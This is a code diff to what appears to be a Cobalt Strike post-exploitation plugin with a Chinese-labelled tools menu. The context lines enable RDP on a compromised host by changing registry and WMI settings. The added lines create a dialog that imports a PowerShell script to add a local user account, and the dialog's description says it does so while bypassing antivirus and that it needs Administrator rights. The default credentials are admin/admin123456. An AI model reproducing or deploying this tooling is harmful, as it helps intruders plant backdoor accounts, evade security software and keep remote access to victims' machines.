@@ -26,6 +26,11 @@ sub Open_rdp{
    brun($1, "wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1");
    brun($1, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");
 }
+sub Adduser{
+    bpowershell_import($bid, script_resource("bin/adduser.ps1"));
+    bpowerpick($bid, "AddUser "."\"$3['username']\" "."\"$3['password']\"");
+}
+
 menu "小工具"{
     item "弹框"{
         $bid = $1['@'];
@@ -51,5 +56,15 @@ menu "小工具"{
         }
         Open_rdp($1);
     }
+    item "API添加用户" {
+            $bid = $1;
+            $add = dialog("AddUser", %(username => "admin", password => "admin123456", bid => $bid), &Adduser);
+            dialog_description($add, "绕过杀软进行添加用户\n条件:拥有Administrator权限");
+
+            drow_text($add, "username", "Username:");
+            drow_text($add, "password", "Password:");
+            dbutton_action($add, "Run");
+            dialog_show($add);
+        }
 
 }
